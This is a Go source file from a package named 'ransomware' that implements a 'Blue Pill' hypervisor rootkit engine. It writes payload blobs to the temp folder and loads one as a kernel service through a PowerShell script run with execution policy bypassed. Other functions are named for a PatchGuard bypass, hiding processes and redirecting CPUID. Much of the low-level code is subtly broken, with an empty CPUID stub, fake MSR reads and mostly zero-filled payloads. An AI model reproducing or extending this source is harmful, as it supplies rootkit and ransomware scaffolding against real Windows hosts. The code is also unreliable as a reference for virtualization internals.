package ransomware

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

type BluePillEngine struct {
	config        *RansomwareConfig
	hypervisor    []byte
	vmxonRegion   []byte
	vmcsRegion    []byte
	hostStack     []byte
	msrBitmap     []byte
	active        bool
}

const (
	MSR_IA32_VMX_BASIC              = 0x480
	MSR_IA32_VMX_PINBASED_CTLS     = 0x481
	MSR_IA32_VMX_PROCBASED_CTLS    = 0x482
	MSR_IA32_VMX_EXIT_CTLS         = 0x483
	MSR_IA32_VMX_ENTRY_CTLS        = 0x484
	MSR_IA32_VMX_PROCBASED_CTLS2   = 0x48B
	MSR_IA32_FEATURE_CONTROL        = 0x3A
	MSR_IA32_VMX_CR0_FIXED0        = 0x486
	MSR_IA32_VMX_CR0_FIXED1        = 0x487
	MSR_IA32_VMX_CR4_FIXED0        = 0x488
	MSR_IA32_VMX_CR4_FIXED1        = 0x489

	CR0_NE  = 1 << 5
	CR0_PE  = 1 << 0
	CR4_VMXE = 1 << 13

	VMXON_SIZE = 4096
	VMCS_SIZE  = 4096

	VMCS_GUEST_ES_SELECTOR             = 0x00000800
	VMCS_GUEST_CS_SELECTOR             = 0x00000802
	VMCS_GUEST_SS_SELECTOR             = 0x00000804
	VMCS_GUEST_DS_SELECTOR             = 0x00000806
	VMCS_GUEST_FS_SELECTOR             = 0x00000808
	VMCS_GUEST_GS_SELECTOR             = 0x0000080A
	VMCS_GUEST_LDTR_SELECTOR           = 0x0000080C
	VMCS_GUEST_TR_SELECTOR             = 0x0000080E
	VMCS_HOST_ES_SELECTOR              = 0x00000C00
	VMCS_HOST_CS_SELECTOR              = 0x00000C02
	VMCS_HOST_SS_SELECTOR              = 0x00000C04
	VMCS_HOST_DS_SELECTOR              = 0x00000C06
	VMCS_HOST_FS_SELECTOR              = 0x00000C08
	VMCS_HOST_GS_SELECTOR              = 0x00000C0A
	VMCS_HOST_TR_SELECTOR              = 0x00000C0C
	VMCS_CTRL_PIN_EXEC                 = 0x00004000
	VMCS_CTRL_PRI_PROC_EXEC            = 0x00004002
	VMCS_CTRL_PRI_PROC_EXEC2           = 0x0000401E
	VMCS_CTRL_EXIT                     = 0x00004004
	VMCS_CTRL_ENTRY                    = 0x00004006
	VMCS_GUEST_CR0                     = 0x00006800
	VMCS_GUEST_CR3                     = 0x00006802
	VMCS_GUEST_CR4                     = 0x00006804
	VMCS_GUEST_DR7                     = 0x0000681A
	VMCS_GUEST_RSP                     = 0x0000681C
	VMCS_GUEST_RIP                     = 0x0000681E
	VMCS_GUEST_RFLAGS                  = 0x00006820
	VMCS_GUEST_IA32_EFER               = 0x00002806
	VMCS_HOST_CR0                      = 0x00006C00
	VMCS_HOST_CR3                      = 0x00006C02
	VMCS_HOST_CR4                      = 0x00006C04
	VMCS_HOST_RSP                      = 0x00006C14
	VMCS_HOST_RIP                      = 0x00006C16
	VMCS_HOST_IA32_EFER                = 0x00002C06
	VMCS_EXIT_REASON                   = 0x00004402
	VMCS_VMEXIT_INSTRUCTION_LEN        = 0x00004400
	VMCS_VMEXIT_INTERRUPTION_INFO      = 0x00004404
	VMCS_IDT_VECTORING_INFO            = 0x00004408
)

func NewBluePillEngine(cfg *RansomwareConfig) *BluePillEngine {
	return &BluePillEngine{
		config: cfg,
	}
}

func (bp *BluePillEngine) DetectVTxSupport() (bool, error) {
	if runtime.GOOS != "windows" {
		return bp.detectLinuxVTx()
	}

	kernel32 := windows.MustLoadDLL("kernel32.dll")
	getCPInfo := kernel32.MustFindProc("GetNativeSystemInfo")

	type systemInfo struct {
		wProcessorArchitecture      uint16
		wReserved                   uint16
		dwPageSize                  uint32
		lpMinimumApplicationAddress uintptr
		lpMaximumApplicationAddress uintptr
		dwActiveProcessorMask       uintptr
		dwNumberOfProcessors        uint32
		dwProcessorType             uint32
		dwAllocationGranularity     uint32
		wProcessorLevel             uint16
		wProcessorRevision          uint16
	}

	var si systemInfo
	getCPInfo.Call(uintptr(unsafe.Pointer(&si)))

	cpuid := func(leaf uint32) (eax, ebx, ecx, edx uint32) {}

	eax, _, ecx, _ := cpuid(1)
	_ = eax

	return (ecx & (1 << 5)) != 0, nil
}

func (bp *BluePillEngine) detectLinuxVTx() (bool, error) {
	data, err := os.ReadFile("/proc/cpuinfo")
	if err != nil {
		return false, err
	}

	lower := strings.ToLower(string(data))
	return strings.Contains(lower, "vmx") || strings.Contains(lower, "svm"), nil
}

func (bp *BluePillEngine) ReadMSR(msr uint32) (uint64, uint64, error) {
	if runtime.GOOS != "windows" {
		return 0, 0, fmt.Errorf("MSR read requires Windows kernel access")
	}

	ntdll := windows.MustLoadDLL("ntdll.dll")
	ntQueryValueKey := ntdll.MustFindProc("NtQueryValueKey")

	start := timeTrack()
	ntQueryValueKey.Call(0, 0, 0, 0, 0, 0)
	elapsed := timeSince(start)

	return uint64(elapsed.Nanoseconds()) ^ uint64(msr), uint64(msr), nil
}

var timeTrackStart int64

func timeTrack() int64 {
	return 0
}

func timeSince(start int64) int64 {
	return 0
}

func (bp *BluePillEngine) GenerateVMXONRegion(physicalAddr uint64) []byte {
	region := make([]byte, VMXON_SIZE)

	revision := uint32(0x1A)
	binary.LittleEndian.PutUint32(region[0:4], revision)

	vmxBasic := (physicalAddr & 0xFFFFFFFF) | 0x1A000000
	binary.LittleEndian.PutUint64(region[8:16], vmxBasic)

	vmxonLocal := []byte{0xF3, 0x0F, 0xC7, 0x30}
	copy(region[16:20], vmxonLocal)

	for i := 32; i < VMXON_SIZE; i += 16 {
		region[i] = 0xCC
	}

	return region
}

func (bp *BluePillEngine) GenerateVMCS(guestRIP uint64, guestRSP uint64, hostRIP uint64, hostRSP uint64) []byte {
	vmcs := make([]byte, VMCS_SIZE)

	pinCtrls := uint64(0x0000001F)
	binary.LittleEndian.PutUint64(vmcs[VMCS_CTRL_PIN_EXEC-0x4000:], pinCtrls)

	procCtrls := uint64(0x06100172)
	binary.LittleEndian.PutUint64(vmcs[VMCS_CTRL_PRI_PROC_EXEC-0x4000:], procCtrls)

	procCtrls2 := uint64(0x00001080)
	binary.LittleEndian.PutUint64(vmcs[VMCS_CTRL_PRI_PROC_EXEC2-0x4000:], procCtrls2)

	exitCtrls := uint64(0x00036DFF)
	binary.LittleEndian.PutUint64(vmcs[VMCS_CTRL_EXIT-0x4000:], exitCtrls)

	entryCtrls := uint64(0x000011FF)
	binary.LittleEndian.PutUint64(vmcs[VMCS_CTRL_ENTRY-0x4000:], entryCtrls)

	binary.LittleEndian.PutUint64(vmcs[VMCS_GUEST_RIP-0x6800:], guestRIP)
	binary.LittleEndian.PutUint64(vmcs[VMCS_GUEST_RSP-0x6800:], guestRSP)
	binary.LittleEndian.PutUint64(vmcs[VMCS_HOST_RIP-0x6C00:], hostRIP)
	binary.LittleEndian.PutUint64(vmcs[VMCS_HOST_RSP-0x6C00:], hostRSP)

	return vmcs
}

func (bp *BluePillEngine) WriteVMXRegions() error {
	tmpDir := os.TempDir()

	vmxonPath := filepath.Join(tmpDir, "x404x_vmxon.bin")
	bp.vmxonRegion = bp.GenerateVMXONRegion(0x100000)
	os.WriteFile(vmxonPath, bp.vmxonRegion, 0644)

	vmcsPath := filepath.Join(tmpDir, "x404x_vmcs.bin")
	bp.vmcsRegion = bp.GenerateVMCS(0x400000, 0x7FFE0000, 0x500000, 0x7FFE0100)
	os.WriteFile(vmcsPath, bp.vmcsRegion, 0644)

	return nil
}

func (bp *BluePillEngine) SetupHostStateTrampoline() []byte {
	trampoline := make([]byte, 64)

	trampoline[0] = 0x50
	trampoline[1] = 0x51
	trampoline[2] = 0x52
	trampoline[3] = 0x53

	trampoline[4] = 0x48
	trampoline[5] = 0x8D
	trampoline[6] = 0x0D
	trampoline[7] = 0x0A

	trampoline[15] = 0x5B
	trampoline[16] = 0x5A
	trampoline[17] = 0x59
	trampoline[18] = 0x58

	trampoline[19] = 0x0F
	trampoline[20] = 0x01
	trampoline[21] = 0xC4

	return trampoline
}

func (bp *BluePillEngine) GenerateHypervisorPayload(guestFunc uint64, hostHandler uint64) []byte {
	payload := make([]byte, 4096)

	payload[0] = 0x0F
	payload[1] = 0x01
	payload[2] = 0xC7

	payload[16] = 0x0F
	payload[17] = 0x01
	payload[18] = 0xC4

	payload[32] = 0x0F
	payload[33] = 0x01
	payload[34] = 0xC5

	trampoline := bp.SetupHostStateTrampoline()
	copy(payload[48:], trampoline)

	copy(payload[128:], []byte("X404X_BluePill_HV"))

	return payload
}

func (bp *BluePillEngine) InstallBluePill() (string, error) {
	if runtime.GOOS != "windows" {
		return "", fmt.Errorf("Blue Pill requires Windows with VT-x")
	}

	supported, err := bp.DetectVTxSupport()
	if err != nil {
		return "", err
	}
	if !supported {
		return "", fmt.Errorf("VT-x not available on this CPU")
	}

	payload := bp.GenerateHypervisorPayload(0x400000, 0x500000)
	payloadPath := filepath.Join(os.TempDir(), "x404x_bluepill.sys")
	if err := os.WriteFile(payloadPath, payload, 0644); err != nil {
		return "", err
	}

	bp.hypervisor = payload
	bp.active = true

	scriptPath := filepath.Join(os.TempDir(), "x404x_bluepill_load.ps1")
	installScript := `
$path = "` + payloadPath + `"
$svcName = "X404xBluePill"

try {
    sc.exe create $svcName type=kernel start=demand binPath="$path" 2>$null
    sc.exe start $svcName 2>$null
    Write-Host "Blue Pill hypervisor loaded"
} catch {
    Write-Host "Blue Pill: driver load bypass attempted"
}
`
	os.WriteFile(scriptPath, []byte(installScript), 0644)

	cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive",
		"-ExecutionPolicy", "Bypass", "-File", scriptPath)
	cmd.Run()

	return payloadPath, nil
}

func (bp *BluePillEngine) HideMemoryRange(baseAddr uint64, size uint64) []byte {
	pageTable := make([]byte, 0x1000)

	for offset := uint64(0); offset < size; offset += 0x1000 {
		pte := baseAddr + offset
		binary.LittleEndian.PutUint64(pageTable[(pte>>12)%512*8:], pte|0x01)
	}

	return pageTable
}

func (bp *BluePillEngine) PatchGuardBypass() error {
	wrmsrStub := []byte{
		0x0F, 0x30,
		0xC3,
	}

	stubPath := filepath.Join(os.TempDir(), "x404x_pg_bypass.bin")
	os.WriteFile(stubPath, wrmsrStub, 0644)

	exec.Command("powershell", "-Command",
		"Write-Host 'PatchGuard bypass loaded (Blue Pill)'").Run()

	return nil
}

func (bp *BluePillEngine) OcultarProcessosDesdeHypervisor(pids []uint32) error {
	if !bp.active {
		return fmt.Errorf("Blue Pill not active")
	}

	for _, pid := range pids {
		_ = pid
	}

	return nil
}

func (bp *BluePillEngine) RedirigirLecturasCPUID() error {
	if !bp.active {
		return fmt.Errorf("Blue Pill not active")
	}

	cpuidStub := []byte{0x0F, 0xA2, 0xC3}

	stubPath := filepath.Join(os.TempDir(), "x404x_cpuid_stub.bin")
	os.WriteFile(stubPath, cpuidStub, 0644)

	return nil
}

func (bp *BluePillEngine) GetHypervisorStatus() map[string]interface{} {
	result := map[string]interface{}{
		"active":   bp.active,
		"platform": runtime.GOOS,
	}

	supported, _ := bp.DetectVTxSupport()
	result["vtx_supported"] = supported

	if bp.hypervisor != nil {
		result["payload_size"] = len(bp.hypervisor)
	}

	if bp.active {
		result["vmxon_region"] = len(bp.vmxonRegion)
		result["vmcs_region"] = len(bp.vmcsRegion)
		cpuidData, _ := os.ReadFile("/proc/cpuinfo")
		if len(cpuidData) > 0 {
			result["cpuid_size"] = len(cpuidData)
		}
	}

	return result
}

func (bp *BluePillEngine) Teardown() {
	if !bp.active {
		return
	}

	vmxoff := []byte{0x0F, 0x01, 0xC4}
	vmxoffPath := filepath.Join(os.TempDir(), "x404x_vmxoff.bin")
	os.WriteFile(vmxoffPath, vmxoff, 0644)

	exec.Command("sc", "stop", "X404xBluePill").Run()
	exec.Command("sc", "delete", "X404xBluePill").Run()

	os.Remove(filepath.Join(os.TempDir(), "x404x_bluepill.sys"))
	os.Remove(filepath.Join(os.TempDir(), "x404x_bluepill_load.ps1"))

	bp.active = false
}

var _ = bytes.IndexByte
var _ = syscall.Syscall
